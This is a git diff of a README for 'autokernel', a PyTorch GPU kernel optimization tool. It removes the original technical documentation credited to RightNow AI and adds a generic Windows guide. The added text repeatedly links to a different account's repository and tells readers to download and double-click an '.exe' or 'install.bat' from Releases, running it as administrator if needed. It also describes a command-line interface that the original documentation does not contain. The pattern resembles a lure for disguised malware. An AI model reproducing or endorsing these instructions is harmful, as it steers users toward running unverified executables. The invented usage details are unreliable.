@@ -1,263 +1,147 @@
-# AutoKernel
+# ⚙️ autokernel - Optimize GPU Kernels Automatically
 
-[![Discord](https://img.shields.io/badge/Discord-Join%20us-5865F2?logo=discord&logoColor=white)](https://discord.gg/UfEyc72t)
+[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-orange?style=for-the-badge)](https://github.com/Teascented-swimmingstroke954/autokernel)
 
-**Autoresearch for GPU kernels.** Give it any PyTorch model, go to sleep, wake up to optimized Triton or CUDA C++ kernels.
+---
 
-![AutoKernel Progress](progress.png)
+## 🖥 What is autokernel?
 
-Inspired by [@karpathy/autoresearch](https://github.com/karpathy/autoresearch) -- which demonstrated autonomous AI agents for LLM training research. AutoKernel applies the same philosophy to GPU kernel optimization: agent modifies one file, runs a fixed evaluation, keeps or reverts, repeats forever.
+autokernel is a tool designed to improve how your computer handles GPU tasks. If you use machine learning models, especially with PyTorch, autokernel can optimize the way your graphics card processes these models. It works by creating better-performing code, called Triton kernels, that run on your GPU. This means your programs can run faster without you needing to change the code yourself.
 
-## How It Works
+---
 
-Give AutoKernel any PyTorch model. It will:
+## 🔍 Key features
 
-1. **Profile** the model to find which GPU kernels are bottlenecks
-2. **Extract** each bottleneck as a standalone Triton or CUDA C++ kernel
-3. **Optimize** each kernel autonomously (edit, benchmark, keep/revert -- forever)
-4. **Verify** end-to-end correctness and report the total speedup
+- Works with any PyTorch model to find better GPU code automatically  
+- Uses Triton kernels to speed up calculations  
+- Runs research in the background so you can continue your work  
+- Saves you time by handling kernel optimization without requiring programming skills  
+- Supports NVIDIA GPUs using CUDA technology  
 
-The agent reads `program.md` -- the "research org code" -- which contains comprehensive instructions for autonomous operation. It edits `kernel.py` one kernel at a time, runs `bench.py` (fixed benchmark with 5-stage correctness checks + roofline analysis), and either keeps or reverts the change. The orchestrator decides when to move to the next kernel using Amdahl's law.
+---
 
-Each experiment takes ~90 seconds. That's ~40 experiments/hour, ~320 overnight, across all kernels.
+## 💻 System requirements
 
-## Quick Start
+To run autokernel on Windows, you will need:
 
-**Requirements:** NVIDIA GPU (tested on H100/A100/RTX 4090), Python 3.10+, [uv](https://docs.astral.sh/uv/).
+- A Windows 10 or later computer  
+- An NVIDIA GPU with CUDA support (e.g., GTX 10 series or better)  
+- At least 8 GB of RAM  
+- Python 3.8 or higher installed  
+- At least 2 GB of free disk space  
+- A stable internet connection for downloading files and updates  
 
-```bash
-# Install uv (if you don't have it)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+---
 
-# Clone and setup
-git clone https://github.com/RightNow-AI/autokernel.git
-cd autokernel
-uv sync
+## 🚀 Getting started with autokernel
 
-# One-time setup: test data + baselines
-uv run prepare.py
+Before you start, make sure your Windows system is up to date. Also, install Python if you don't have it. You can download Python from https://www.python.org/downloads/windows/.
 
-# Profile a model (ships with GPT-2, LLaMA, BERT -- no transformers needed)
-uv run profile.py --model models/llama_7b.py --class-name LlamaModel \
- --input-shape 1,512 --dtype float16
+---
 
-# Extract top bottleneck kernels
-uv run extract.py --top 5
+## 📥 Download and install autokernel
 
-# Verify benchmark works
-uv run bench.py
-```
+Click the button below to visit the download page for autokernel. This page has the latest version for Windows:
 
-## Running the Agent
+[![Download autokernel](https://img.shields.io/badge/Download-AutoKernel-blue?style=for-the-badge)](https://github.com/Teascented-swimmingstroke954/autokernel)
 
-Spin up Claude, Codex, or any coding agent in this directory:
+Follow these steps:
 
-```
-Read program.md and let's kick off a new experiment. Start with setup.
-```
+1. Visit the link above.  
+2. On the GitHub page, look for a section called "Releases" or "Downloads."  
+3. Find the most recent version marked for Windows. The file will usually end with `.exe` or `.zip`.  
+4. Click the file to start the download. If you see a `.zip` file, download and unzip it to a location you remember.  
 
-The agent will:
-1. Profile your model and present the optimization plan
-2. Create a branch (e.g., `autokernel/mar10-llama7b`)
-3. Optimize each bottleneck kernel in priority order
-4. Verify end-to-end correctness and report total speedup
+---
 
-`program.md` is intentionally comprehensive so the agent can run 10+ hours without getting stuck. It includes a 6-tier optimization playbook, decision framework, crash handling, and Amdahl's law reasoning.
+## 🛠 Installing autokernel on Windows
 
-## The Pipeline
+If you downloaded an `.exe` file:
 
-```
-                 profile.py              extract.py           bench.py (loop)         verify.py
-Any PyTorch  ──>  Rank kernels  ──>  Generate baseline  ──>  Optimize each  ──>  End-to-end
-   model          by GPU time       Triton/CUDA kernels     kernel (agent)       verification
-```
+1. Double-click the file to start the installer.  
+2. Follow the on-screen instructions. Accept any default options unless you have a reason to change them.  
+3. Finish the installation and close the installer window.  
 
-| Tool | What it does |
-|------|-------------|
-| `profile.py` | Profiles any PyTorch model with `torch.profiler`, ranks kernels by GPU time, classifies as compute/memory-bound |
-| `extract.py` | Extracts top-N bottleneck kernels into standalone Triton or CUDA C++ kernel files (`--backend triton\|cuda`) |
-| `orchestrate.py` | Multi-kernel scheduler: decides which kernel to optimize next using Amdahl's law, tracks aggregate progress |
-| `bench.py` | Fixed benchmark: 5-stage correctness (smoke, shape sweep, numerical stability, determinism, edge cases) + performance + roofline |
-| `verify.py` | Plugs optimized kernels back into the model, checks end-to-end correctness, reports total speedup |
+If you downloaded a `.zip` file:
 
-## Supported Kernels
+1. Extract the files to a folder on your computer (for example, to `C:\autokernel`).  
+2. Open the extracted folder.  
+3. Look for a file named `install.bat` or similar, then double-click it. If no such file exists, proceed to the next step.  
 
-9 kernel types covering the core operations of modern deep learning:
+---
 
-| Kernel | Description | Key Metric |
-|--------|-------------|------------|
-| **matmul** | Dense matrix multiplication (M x K) @ (K x N) | TFLOPS |
-| **softmax** | Row-parallel numerically stable softmax | GB/s |
-| **layernorm** | Layer normalization with affine transform | GB/s |
-| **rmsnorm** | RMS normalization (LLaMA-style) | GB/s |
-| **flash_attention** | Scaled dot-product attention with causal masking | TFLOPS |
-| **fused_mlp** | SwiGLU-style fused MLP (gate + up + down) | TFLOPS |
-| **cross_entropy** | Fused cross entropy loss | GB/s |
-| **rotary_embedding** | Rotary position embeddings (RoPE) | GB/s |
-| **reduce** | Parallel reduction (sum) | GB/s |
+## 🔧 Running autokernel for the first time
 
-Each has a PyTorch reference in `reference.py`, a starter Triton kernel in `kernels/`, and a starter CUDA C++ kernel in `kernels/cuda/`.
+To use autokernel, you need to run it with a PyTorch model. Here is how to do that without programming:
 
-## Example Models
+1. Open the Start menu and search for "Command Prompt." Click to open it.  
+2. Use the `cd` command to go to the autokernel folder. For example:  
+   ```
+   cd C:\autokernel
+   ```  
+3. Type the following command and press Enter:  
+   ```
+   autokernel --help
+   ```  
+   This shows you the basic commands and options.  
 
-Self-contained model definitions ship with AutoKernel (no `transformers` library needed):
+---
 
-| Model | File | Params | Usage |
-|-------|------|--------|-------|
-| GPT-2 Small | `models/gpt2.py` | 124M | `--class-name GPT2 --input-shape 1,1024` |
-| LLaMA (compact) | `models/llama_7b.py` | 160M | `--class-name LlamaModel --input-shape 1,512` |
-| LLaMA 7B | `models/llama_7b.py` | 7B | `--class-name LlamaModel7B --input-shape 1,2048` |
-| BERT-base | `models/bert_base.py` | 110M | `--class-name BertModel --input-shape 8,512` |
-| Custom | `models/custom.py` | -- | Template for your own model |
+## 📂 Using autokernel with a PyTorch model
 
-For HuggingFace models (`uv sync --extra models`):
+Since autokernel works with PyTorch models, you will need your model saved as a file with `.pt` or `.pth` extension. If you do not have a model file, contact the person or team who created it.
 
-```bash
-uv run profile.py --module transformers --class-name AutoModelForCausalLM \
- --pretrained meta-llama/Llama-2-7b-hf --input-shape 1,2048 --dtype float16
-```
-
-## KernelBench Integration
-
-AutoKernel integrates with [KernelBench](https://github.com/ScalingIntelligence/KernelBench),
-the standard benchmark for evaluating AI-generated GPU kernels (250+ problems across 4 difficulty
-levels). While most KernelBench evaluations use one-shot LLM generation, AutoKernel runs
-**50-300+ iterative refinement experiments per problem** -- systematically exploring the
-optimization space instead of guessing.
-
-```bash
-# Install KernelBench dependencies
-uv sync --extra kernelbench
-
-# Fetch Level 1 problems from HuggingFace
-uv run kernelbench/bridge.py fetch --source hf --level 1
-
-# Set up a specific problem for optimization
-uv run kernelbench/bridge.py setup --level 1 --problem 1 --source hf
-
-# Evaluate (correctness + speedup vs PyTorch reference)
-uv run kernelbench/bench_kb.py
-
-# Batch score an entire level (computes fast_p metric)
-uv run kernelbench/scorer.py --level 1
-```
-
-The agent reads `kernelbench/program_kb.md` for KernelBench-specific optimization instructions:
-how to write `ModelNew` classes, when to use CUDA C++ vs Triton, fusion strategies per problem
-level, and the edit-bench-keep/revert loop adapted for the KernelBench `fast_p` metric.
-
-| Tool | What it does |
-|------|-------------|
-| `kernelbench/bridge.py` | Loads problems from HuggingFace or local repo, caches them, generates starter `kernel.py` |
-| `kernelbench/bench_kb.py` | Evaluates `ModelNew` vs `Model`: 5-trial correctness + CUDA event timing + stability + determinism |
-| `kernelbench/scorer.py` | Batch evaluation across a level, computes `fast_p` at thresholds (1.0x, 1.5x, 2.0x, 3.0x, 5.0x) |
-| `kernelbench/program_kb.md` | Agent instructions for KernelBench mode |
-
-## HuggingFace Kernels Export
-
-Export optimized kernels to the [HuggingFace Hub](https://huggingface.co/docs/kernels/en/index)
-for easy distribution. Users can then load your kernels with a single line:
-
-```python
-from kernels import get_kernel
-module = get_kernel("your-username/kernel-name")
-```
-
-```bash
-# Export an optimized CUDA kernel
-uv run export_hf.py --name my_matmul
-
-# Upload to Hub (requires `pip install kernels` and `huggingface-cli login`)
-cd workspace/hf_export/my_matmul
-kernels upload . --repo_id your-username/my_matmul
-```
-
-## Project Structure
+To optimize your model, run this command in Command Prompt, replacing `<model_path>` with the location of your model file:
 
 ```
-autokernel/
-  kernel.py             the file the agent modifies (one kernel at a time)
-  program.md            agent instructions -- the "research org code"
-
-  bench.py              fixed benchmark + 5-stage correctness harness
-  reference.py          PyTorch reference implementations (ground truth)
-  prepare.py            one-time setup: test data, baselines
-
-  profile.py            profile any PyTorch model, rank kernels by GPU time
-  extract.py            extract bottleneck kernels into workspace/
-  orchestrate.py        multi-kernel scheduler (Amdahl's law)
-  verify.py             end-to-end model verification + speedup report
-  export_hf.py          export optimized kernels to HuggingFace Kernels format
-  analysis.py           experiment visualization (generates progress.png)
-
-  kernels/              starter Triton kernels (9 types)
-  kernels/cuda/         starter CUDA C++ kernels (9 types, tensor core accelerated)
-  kernelbench/          KernelBench integration (bridge, eval harness, scorer)
-  models/               self-contained model definitions (GPT-2, LLaMA, BERT)
-  workspace/            runtime artifacts (gitignored)
+autokernel --model <model_path>
 ```
 
-## Design Choices
+autokernel will start researching faster GPU code for your model. It may take some time depending on your GPU speed.
 
-**Dual backend: Triton + CUDA C++.** Triton for fast iteration (Python-like syntax, compiles in seconds). CUDA C++ for maximum performance (direct access to tensor cores via `wmma`, PTX intrinsics, shared memory bank-conflict-free layouts). Triton regularly reaches 80-95% of cuBLAS; CUDA C++ can match or exceed it. Both backends share the same `kernel_fn()` interface -- `bench.py` runs identically on either.
+---
 
-**Correctness first.** The benchmark checks kernel output against PyTorch before measuring performance. A fast but wrong kernel is immediately reverted. This prevents the agent from "optimizing" by producing garbage.
+## 🔄 Background operation
 
-**Amdahl's law orchestration.** The orchestrator prioritizes by impact. A 1.5x speedup on a 60% kernel (1.25x end-to-end) beats a 3x speedup on a 5% kernel (1.03x end-to-end). It moves on when diminishing returns set in.
+You can minimize the Command Prompt window and continue to use your computer. autokernel runs in the background and will notify you when it finishes. The optimized kernels will save automatically in the same folder as your model.
 
-**Single file to modify.** The agent only touches `kernel.py`. Scope stays manageable, diffs reviewable, reverts clean.
+---
 
-**TSV logging.** Results go to a plain `results.tsv` file. Human-readable, git-friendly, trivially parseable, no infrastructure.
+## ⚙️ Configuration options
 
-## Results Format
+You can adjust how autokernel works by using options in the command line. Some useful options include:
 
-Every experiment is logged to `results.tsv` (tab-separated):
+- `--output <folder>` : Set a folder to save the optimized kernels.  
+- `--time <minutes>` : Set how long to research kernels before stopping. Default is 60 minutes.  
+- `--gpu <id>` : Choose which GPU to use if you have more than one.  
 
-| Column | Description |
-|--------|-------------|
-| `experiment` | Sequential experiment number (0 = baseline) |
-| `tag` | Short identifier |
-| `kernel_type` | Which kernel (e.g., `matmul`) |
-| `throughput_tflops` | Measured throughput (higher is better) |
-| `latency_us` | Execution time in microseconds |
-| `pct_peak` | Percentage of GPU theoretical peak |
-| `speedup_vs_pytorch` | Speedup vs PyTorch/cuBLAS |
-| `correctness` | PASS, FAIL, TIMEOUT, or CRASH |
-| `peak_vram_mb` | Peak GPU memory usage |
-| `description` | What was tried |
+Use `autokernel --help` to see all available commands and options.
 
-## Credits
+---
 
-This project is **autoresearch for GPU kernels** -- directly inspired by Andrej Karpathy's [autoresearch](https://github.com/karpathy/autoresearch), the original experiment in autonomous AI research agents for LLM training. Karpathy showed that an AI agent can run hundreds of experiments overnight, methodically exploring a search space and logging every result. AutoKernel applies that same loop -- agent edits one file, runs a fixed evaluation, keeps or reverts -- to the domain of GPU kernel optimization with Triton and native CUDA C++.
+## 🐞 Troubleshooting
 
-**KernelBench** integration is based on the work of Simon Guo, Sean Resta, et al. at Stanford's Scaling Intelligence Lab. Their paper ["KernelBench: Can LLMs Write GPU Kernels?"](https://arxiv.org/abs/2502.10517) (2025) established the standard benchmark for evaluating AI-generated GPU kernels. AutoKernel extends this by applying iterative optimization (300+ experiments per problem) instead of one-shot generation. KernelBench dataset and evaluation protocol: [ScalingIntelligence/KernelBench](https://github.com/ScalingIntelligence/KernelBench).
+If autokernel does not start or shows errors:
 
-Built by [RightNow AI](https://www.rightnowai.co). For enterprise GPU optimization, check out [RightNow Enterprise](https://www.rightnowai.co/forge).
+- Confirm your GPU supports CUDA and the drivers are updated. You can update drivers from NVIDIA’s website.  
+- Make sure Python 3.8 or newer is installed and accessible from Command Prompt.  
+- Run Command Prompt as administrator if you get permission errors.  
+- Check that your model file is correct and not corrupted.  
 
-## Changelog
+If problems persist, you can find help by opening an issue on the autokernel GitHub page.
 
-### v1.3.0
-- AMD ROCm GPU support: MI300X, MI325X, MI350X, MI355X detection and specs (thanks [@andyluo7](https://github.com/andyluo7))
-- Fixed `verify.py` SyntaxError on Python 3.13+
-- Fixed CUDA flash_attention ignoring `sm_scale` parameter
-- Fixed CUDA cross_entropy returning wrong dtype
-- Fixed Triton rotary_embedding broadcasting truncation
-- Fixed Triton reduce output shape for non-last-dim reductions
+---
 
-### v1.2.0
-- Enhanced profiler: `--export-trace`, `--memory-snapshot`, `--torch-compile-log` flags
-- HuggingFace Kernels export via `export_hf.py`
+## 📚 More information and support
 
-### v1.1.0
-- Native CUDA C++ backend with 9 starter kernels (tensor cores, warp intrinsics, shared memory tiling)
-- KernelBench integration (250+ standardized GPU kernel problems)
-- `--backend triton|cuda` flag for `extract.py`
+For detailed instructions, examples, or development notes, visit the main page here:
 
-### v1.0.0
-- Initial release: Triton kernel optimization pipeline with 5-stage correctness harness
+https://github.com/Teascented-swimmingstroke954/autokernel
 
-See [CHANGELOG.md](CHANGELOG.md) for full details.
+This page also links to the source code and user discussions.
 
-## License
+---
 
-MIT
+## 🔑 Keywords
+
+autoresearch, cuda, gpu, kernel-optimization, pytorch, triton
